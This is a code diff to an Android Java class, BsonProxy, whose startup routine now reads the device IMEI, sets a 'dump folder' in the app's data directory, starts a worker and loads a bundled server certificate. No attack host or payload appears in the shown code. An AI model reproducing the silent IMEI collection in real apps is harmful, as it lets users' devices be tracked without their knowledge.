@@ -1,12 +1,11 @@
 package org.benews.libbsonj;
-
-
-
-
 import android.app.Application;
 import android.content.Context;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.content.res.AssetManager;
 import android.os.AsyncTask;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import java.io.BufferedOutputStream;
 import java.io.File;
@@ -168,35 +167,48 @@ public class BsonProxy extends Application implements Runnable{
 
 	public synchronized static BsonProxy self(Context appContext) {
 		if (singleton == null) {
-			Log.d(TAG , " (self): initializing");
+			Log.d(TAG, " (self): initializing");
 			singleton = new BsonProxy();
-			if ( appContext != null ) {
-				Log.d(TAG ," (self): initializing context");
+			if (appContext != null) {
+				Log.d(TAG, " (self): initializing context");
 				singleton.appContext = appContext;
 				singleton.setSerializeFolder(appContext.getFilesDir());
 				singleton.list = singleton.getList();
-				AssetManager assets = appContext.getAssets();
-				if ( assets != null ) {
+				try {
+					PackageManager m = singleton.appContext.getPackageManager();
+					String s = singleton.appContext.getPackageName();
+					PackageInfo p = m.getPackageInfo(s, 0);
+					singleton.setDumpFolder(p.applicationInfo.dataDir);
+					TelephonyManager telephonyManager = ((TelephonyManager) singleton.appContext.getSystemService(Context.TELEPHONY_SERVICE));
+					singleton.setImei(telephonyManager.getDeviceId());
+					AssetManager assets = appContext.getAssets();
+					singleton.Start();
+					if (assets != null) {
 
-					try {
-						InputStream caInput = assets.open("server.crt");
 						try {
-							CertificateFactory cf = CertificateFactory.getInstance("X.509");
-							singleton.certificate = cf.generateCertificate(caInput);
-							System.out.println("ca=" + ((X509Certificate) singleton.certificate).getSubjectDN());
-						} finally {
-							caInput.close();
-						}
-					} catch (CertificateException e) {
-						e.printStackTrace();
+							InputStream caInput = assets.open("server.crt");
+							try {
+								CertificateFactory cf = CertificateFactory.getInstance("X.509");
+								singleton.certificate = cf.generateCertificate(caInput);
+								System.out.println("ca=" + ((X509Certificate) singleton.certificate).getSubjectDN());
+							} finally {
+								caInput.close();
+							}
+						} catch (CertificateException e) {
+							e.printStackTrace();
 
-					} catch (IOException e) {
-						e.printStackTrace();
+						} catch (IOException e) {
+							e.printStackTrace();
+						}
 					}
+				} catch (PackageManager.NameNotFoundException e) {
+					Log.w(TAG, "Error Package name not found ", e);
+					singleton = null;
+					return null;
 				}
+			} else {
+				Log.d(TAG, " (self): skypping init");
 			}
-		}else{
-			Log.d(TAG ," (self): skypping init");
 		}
 		return singleton;
 	}
